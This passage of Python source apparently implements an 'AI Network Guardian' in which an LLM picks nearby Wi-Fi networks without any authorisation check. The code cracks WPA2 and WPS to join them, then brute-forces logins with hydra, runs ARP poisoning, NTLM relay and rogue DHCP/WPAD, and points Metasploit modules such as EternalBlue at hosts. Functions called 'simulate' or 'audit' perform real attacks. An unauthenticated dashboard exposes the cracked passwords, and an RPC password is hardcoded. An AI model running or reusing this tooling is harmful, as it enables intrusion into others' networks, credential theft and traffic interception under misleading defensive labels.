            update_status(f"Nikto scan on {target_ip}:{port} complete.", "Vulnerability Scan")
            return process.stdout
        except Exception as e:
            update_status(f"Nikto scan failed: {e}", "Error")
            return None

    def test_service_credentials(self, target_ip, port, service, password_list):
        update_status(f"Starting credential strength test on {target_ip}:{port} ({service})...", "Credential Audit")
        user_list = os.path.join(AI_MODEL_PATH, "common_users.txt")
        pass_file = "/tmp/hydra_pass.txt"
        with open(pass_file, "w") as f:
            for p in password_list: f.write(p + "\n")
        
        try:
            cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=HYDRA_TIMEOUT)
            creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
            if creds_match:
                username = creds_match.group(1)
                password = creds_match.group(2)
                update_status(f"VULNERABILITY: Weak credentials found for {service} on {target_ip} - {username}:{password}", "Vulnerability Found")
                if target_ip in guardian_state["analyzed_hosts"]:
                    guardian_state["analyzed_hosts"][target_ip]["credentials"][service] = f"{username}:{password}"
                return f"{username}:{password}"
            else:
                update_status(f"Credential test on {target_ip}:{port} completed. No weak credentials found.", "Credential Audit")
                return None
        except Exception as e:
            update_status(f"Credential test failed: {e}", "Error")
            return None
        finally:
            if os.path.exists(pass_file): os.remove(pass_file)

    def enumerate_smb_shares(self, target_ip):
        update_status(f"Enumerating SMB shares on {target_ip}...", "Discovery")
        try:
            cmd = ["smbclient", "-L", f"//{target_ip}", "-N"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
            if shares and target_ip in guardian_state["analyzed_hosts"]:
                guardian_state["analyzed_hosts"][target_ip]["shares"] = shares
                update_status(f"Found open SMB shares on {target_ip}: {shares}. Recommend restricting access.", "Vulnerability Found")
            return shares
        except Exception as e:
            update_status(f"SMB enumeration failed: {e}", "Error")
            return []

    def simulate_arp_poisoning(self, target_ip, gateway_ip):
        update_status(f"Simulating ARP poisoning between {target_ip} and {gateway_ip} to test resilience...", "MITM Simulation")
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            guardian_state["mitm_simulation"] = { "target_ip": target_ip, "gateway_ip": gateway_ip, "processes": [target_proc.pid, gw_proc.pid] }
            update_status(f"ARP poisoning simulation active between {target_ip} and {gateway_ip}", "MITM Simulation")
            return True
        except Exception as e:
            update_status(f"ARP poisoning simulation failed: {e}", "Error")
            return False

    def get_wan_ip(self):
        update_status("Determining WAN IP address...", "Discovery")
        try:
            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True, check=True, timeout=10)
            wan_ip = result.stdout.strip()
            guardian_state["wan_ip"] = wan_ip
            update_status(f"WAN IP: {wan_ip}", "Discovery")
            return wan_ip
        except Exception as e:
            update_status(f"Failed to get WAN IP: {e}", "Error")
            return None

    def _load_audit_history(self):
        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
        try:
            if os.path.exists(history_file):
                with open(history_file, 'r') as f: return json.load(f)
        except Exception: pass
        return []

    def _calculate_success_rates(self, history):
        if not history: return {}
        success_counts, total_counts = {}, {}
        for entry in history:
            audit_type = entry.get('action')
            if audit_type:
                total_counts[audit_type] = total_counts.get(audit_type, 0) + 1
                if entry.get('success'):
                    success_counts[audit_type] = success_counts.get(audit_type, 0) + 1
        return { t: (success_counts.get(t, 0) / total_counts[t]) for t in total_counts }

    def simulate_ntlm_relay(self, targets: list[str]):
        update_status(f"Simulating NTLMv2 relay against {targets} to test for vulnerability", "Simulation")
        config = NTLMRelayxConfig(); config.targets = targets
        relay = NTLMRelayx(config)
        threading.Thread(target=relay.start, daemon=True).start()
        return True

    def simulate_dhcp_wpad_spoof(self, rogue_dns: str = None):
        dns = rogue_dns or guardian_state.get("wan_ip", "8.8.8.8")
        update_status("Simulating rogue DHCP & WPAD to test resilience", "Simulation")
        dhcp_conf = f"default-lease-time 600;\nmax-lease-time 7200;\nauthoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {{\n  range 10.0.0.50 10.0.0.200;\n  option routers 10.0.0.1;\n  option domain-name-servers {dns};\n  option wpad.url \"http://{dns}/wpad.dat\";\n}}"
        with open("/tmp/dhcpd.conf", "w") as f: f.write(dhcp_conf)
        subprocess.Popen(["sudo", "dhcpd", "-cf", "/tmp/dhcpd.conf", self.interface])
        update_status("Rogue DHCP simulation is up", "Simulation")
        return True

    def masscan_scan(self, cidr: str, rate: int = 100000):
        update_status(f"Running masscan on {cidr} @ {rate}pps", "Discovery (masscan)")
        out = "/tmp/masscan.json"
        cmd = ["masscan", cidr, "-p1-65535", f"--rate={rate}", "-oJ", out]
        subprocess.run(cmd, check=True, timeout=60)
        with open(out) as f: results = json.load(f)
        update_status(f"masscan returned {len(results)} entries", "Discovery (masscan)")
        return results

    def _log_audit_result(self, action, target, success, details):
        entry = { "timestamp": time.time(), "action": action, "target": target, "success": success, "details": details }
        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
        history = self._load_audit_history()
        history.append(entry)
        try:
            with open(history_file, 'w') as f: json.dump(history, f)
        except Exception as e:
            update_status(f"Failed to log audit result: {e}", "Warning")

class VulnerabilitySimulator:
    def __init__(self, rpc_pass="abc123"):
        self.client = MsfRpcClient(rpc_pass, timeout=30)
    
    def simulate_exploit(self, exploit_name, target_ip, payload="generic/shell_reverse_tcp"):
        mod = self.client.modules.use('exploit', exploit_name)
        mod['RHOSTS'] = target_ip
        mod['PAYLOAD'] = payload
        lhost, _ = LanAnalyzer(LAN_INTERFACE).get_local_ip_and_subnet()
        mod['LHOST'] = lhost
        # Use check_exploit to safely test, not execute
        result = mod.check()
        update_status(f"Metasploit check for {exploit_name} on {target_ip} returned: {result}", "Simulation")
        return result.get('code') == 'vulnerable'

    def simulate_known_vulnerabilities(self, target_ip, port, service):
        update_status(f"Simulating known exploits on {target_ip}:{port} ({service})...", "Simulation")
        # This would contain logic to map services to non-destructive checks
        return False # Placeholder

    def self_update(self):
        update_status("Performing self-update...", "Update")
        try:
            subprocess.run(['git','-C','/opt/guardian','pull'], check=True, timeout=60)
            subprocess.run(['sudo','apt','update'], check=True, timeout=120)
            subprocess.run(['sudo','apt','install','-y', 'metasploit-framework','masscan','bettercap'], check=True, timeout=300)
            update_status("Self-update complete.", "Update")
        except Exception as e:
            update_status(f"Self-update failed: {e}", "Error")

    def ai_guardian_loop(self):
        update_status("AI Network Guardian starting...", "Running")
        if not getattr(self, "updated", False) and self.lan.get_wan_ip():
            self.self_update()
            self.updated = True
        
        guardian_state["ai_running"] = True
        
        while not guardian_state["stop_signal"].is_set():
            if not guardian_state["audited_networks"]:
                networks = self.wifi.scan_wifi_networks()
                available = [n for n in networks if n.get("ssid") not in guardian_state["audited_networks"]]
                if not available:
                    time.sleep(30)
                    continue

                decision = self.get_wifi_audit_decision(available)
                if not decision or "target_ssid" not in decision:
                    time.sleep(10)
                    continue

                target_ssid = decision["target_ssid"]
                target_net = next((n for n in available if n["ssid"] == target_ssid), None)
                if not target_net: continue

                success = False
                action = decision.get("action")

                if action == "CONNECT_OPEN":
                    success = self.wifi.connect_to_network(target_ssid)
                    if success: guardian_state["audited_networks"][target_ssid] = "N/A (Open)"
                
                elif action == "AUDIT_WPA2":
                    handshake_file = self.wifi.capture_handshake_for_audit(target_ssid, target_net["bssid"], target_net["channel"])
                    if handshake_file:
                        password = self.analyzer.analyze_handshake(handshake_file, target_ssid)
                        if password:
                            update_status(f"VULNERABILITY: Weak password '{password}' found for {target_ssid}. Recommend changing it.", "Vulnerability Found")
                            success = self.wifi.connect_to_network(target_ssid, password)
                            if success: guardian_state["audited_networks"][target_ssid] = password
                
                elif action == "AUDIT_WPS":
                    password = self.wifi.audit_wps(target_net["bssid"])
                    if password:
                        success = self.wifi.connect_to_network(target_ssid, password)
                        if success: guardian_state["audited_networks"][target_ssid] = password

                elif action == "SIMULATE_ROGUE_AP":
                    if self.wifi.simulate_rogue_ap(target_ssid, target_net["channel"], self.llm):
                        update_status(f"Rogue AP simulation for {target_ssid} is active.", "Simulation")
                    
                if success:
                    log_to_sd_card("audited_wifi.log", f"{target_ssid}:{guardian_state['audited_networks'][target_ssid]}")
                    save_state()
                    self.execute_internal_analysis_sequence()
                else:
                    update_status(f"Audit of {target_ssid} with method {action} complete. No immediate vulnerabilities found.", "Wi-Fi Audit", target_ssid)
            else:
                self.execute_internal_analysis_sequence()
            
            save_state()
            guardian_state["stop_signal"].wait(timeout=60)
        
        self.llm.close()
        update_status("AI Network Guardian stopped.", "Stopped")

    def execute_internal_analysis_sequence(self):
        update_status("Starting internal network analysis...", "Internal Analysis")
        decision = self.get_internal_analysis_decision()
        if not decision or "action" not in decision:
            update_status("AI failed to provide a valid analysis decision. Defaulting to network scan.", "Error")
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Discovery")
            return

        action = decision.get("action")
        target_ip = decision.get("target_ip")
        port = decision.get("port")
        service = decision.get("service")

        if action == "SCAN_NETWORK":
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Discovery")
                self.audit_ssh_credentials(subnet_range)
        
        elif action == "VULNERABILITY_SCAN":
            if target_ip and port: 
                results = self.lan.run_nikto_scan(target_ip, port)
                if results:
                    summary = self.summarize_vulns({target_ip: {"vulnerabilities": {port: results}}})
                    update_status(f"Vulnerability Summary for {target_ip}:{port}: {json.dumps(summary, indent=2)}", "Discovery")
            else: update_status("Vulnerability scan requires target_ip and port.", "Error")

        elif action == "TEST_SERVICE_CREDS":
            if target_ip and port and service:
                self.lan.test_service_credentials(target_ip, port, service, self.analyzer.common_passwords)
            else: update_status("Credential test requires target_ip, port, and service.", "Error")

        elif action == "ENUMERATE_SMB_SHARES":
            if target_ip: self.lan.enumerate_smb_shares(target_ip)
            else: update_status("SMB enumeration requires target_ip.", "Error")
        
        elif action == "SIMULATE_NTLM_RELAY":
            targets = decision.get("targets", [])
            if targets: self.lan.simulate_ntlm_relay(targets)
            else: update_status("SIMULATE_NTLM_RELAY needs a list of target IPs", "Error")

        elif action == "SIMULATE_DHCP_WPAD_SPOOF":
            dns = decision.get("rogue_dns")
            self.lan.simulate_dhcp_wpad_spoof(rogue_dns=dns)

        elif action == "MASSCAN_SCAN":
            cidr = decision.get("cidr")
            if cidr:
                results = self.lan.masscan_scan(cidr)
                update_status(f"masscan results: {results}", "Discovery")
            else: update_status("MASSCAN_SCAN needs cidr", "Error")

        elif action == "SIMULATE_EXPLOIT":
            if target_ip and port and service:
                exploit_name = self._get_metasploit_exploit(service, port)
                if exploit_name:
                    self.simulator.simulate_exploit(exploit_name, target_ip)
                else:
                    update_status(f"No known Metasploit check for {service} on port {port}", "Error")
            else:
                update_status("Exploit simulation requires target_ip, port and service", "Error")

    def _get_metasploit_exploit(self, service, port):
        service = service.lower()
        if "http" in service: return "exploit/multi/http/struts2_content_type_ognl"
        elif "smb" in service and port == "445": return "exploit/windows/smb/ms17_010_eternalblue"
        elif "ssh" in service and port == "22": return "exploit/multi/ssh/sshexec"
        return None

# --- Web Dashboard (Flask) & Main Entry Point ---
from flask import Flask, render_template_string, jsonify, request

web_app = Flask(__name__)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>AI Network Guardian</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white p-8">
    <h1 class="text-4xl text-green-400 mb-4">AI Network Guardian Dashboard</h1>
    <div class="grid grid-cols-2 gap-4">
        <div><h2 class="text-xl">Status: <span id="status" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Phase: <span id="phase" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Target: <span id="target" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Audited: <span id="audited-count" class="text-green-400"></span></h2></div>
    </div>
    <div class="my-4">
        <button id="start-btn" class="bg-blue-500 p-2 rounded">Start AI Guardian</button>
        <button id="stop-btn" class="bg-red-500 p-2 rounded">Stop AI Guardian</button>
    </div>
    <h2 class="text-2xl mt-4">Log Stream</h2>
    <div id="log-stream" class="bg-black p-4 h-64 overflow-y-scroll font-mono"></div>
    <h2 class="text-2xl mt-4">Audited Networks (with weak passwords)</h2>
    <div id="audited-list" class="bg-black p-4 font-mono"></div>
    <h2 class="text-2xl mt-4">Analyzed Hosts & Vulnerabilities</h2>
    <div id="host-list" class="bg-black p-4 font-mono"></div>
    <script>
        function fetchStatus() {
            fetch('/status').then(res => res.json()).then(data => {
                document.getElementById('status').textContent = data.status;
                document.getElementById('phase').textContent = data.current_phase;
                document.getElementById('target').textContent = data.current_target_ssid;
                document.getElementById('audited-count').textContent = Object.keys(data.audited_networks).length;
                document.getElementById('log-stream').innerHTML = data.log_stream.join('<br>');
                document.getElementById('log-stream').scrollTop = document.getElementById('log-stream').scrollHeight;
                let auditedHtml = '';
                for (const ssid in data.audited_networks) {
                    auditedHtml += `SSID: ${ssid}, Pass: ${data.audited_networks[ssid]}<br>`;
                }
                document.getElementById('audited-list').innerHTML = auditedHtml;
                let hostHtml = '';
                for (const ip in data.analyzed_hosts) {
                    const host = data.analyzed_hosts[ip];
                    hostHtml += `<b>IP: ${ip}</b> (OS: ${host.os})<br>`;
                    for (const port in host.ports) {
                        const p = host.ports[port];
                        hostHtml += `&nbsp;&nbsp;- Port ${port}: ${p.service} (${p.product} ${p.version})<br>`;
                    }
                    for (const port in host.vulnerabilities) {
                        hostHtml += `&nbsp;&nbsp;- Vulns on ${port}:<pre>${host.vulnerabilities[port]}</pre><br>`;
                    }
                    for (const service in host.credentials) {
                        hostHtml += `&nbsp;&nbsp;- Weak Creds for ${service}: ${host.credentials[service]}<br>`;
                    }
                    if (host.shares && host.shares.length > 0) {
                        hostHtml += `&nbsp;&nbsp;- Open SMB Shares: ${host.shares.join(', ')}<br>`;
                    }
                }
                document.getElementById('host-list').innerHTML = hostHtml;
            });
        }
        function sendCommand(cmd) { fetch('/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command: cmd}) }); }
        document.getElementById('start-btn').onclick = () => sendCommand('start_ai');
        document.getElementById('stop-btn').onclick = () => sendCommand('stop_ai');
        setInterval(fetchStatus, 2000);
        fetchStatus();
    </script>
</body>
</html>
"""

@web_app.route('/')
def index(): return render_template_string(DASHBOARD_HTML)

@web_app.route('/status')
def get_status(): return jsonify(guardian_state)

@web_app.route('/command', methods=['POST'])
def handle_command():
    command = request.json.get('command')
    if command == "start_ai" and not guardian_state["ai_running"]:
        guardian_state["stop_signal"].clear()
        threading.Thread(target=ai_orchestrator.ai_guardian_loop, daemon=True).start()
        return jsonify({"status": "AI Guardian started"})
    elif command == "stop_ai" and guardian_state["ai_running"]:
        guardian_state["stop_signal"].set()
        guardian_state["ai_running"] = False
        return jsonify({"status": "AI Guardian stopping"})
    return jsonify({"status": "Invalid command or state"}), 400

if __name__ == "__main__":
    load_state()
    llm_client = StackFlowClient(LLM_ZMQ_ENDPOINT)
    
    if not llm_client.connect() or not llm_client.setup_llm():
        update_status("Critical: Unable to initialize LLM630. Exiting.", "Error")
        exit(1)
        
    ai_orchestrator = AIAnalysisOrchestrator(llm_client)
    
    update_status("Starting Web Dashboard...", "UI Init")
    web_app.run(host='0.0.0.0', port=8081, debug=False)
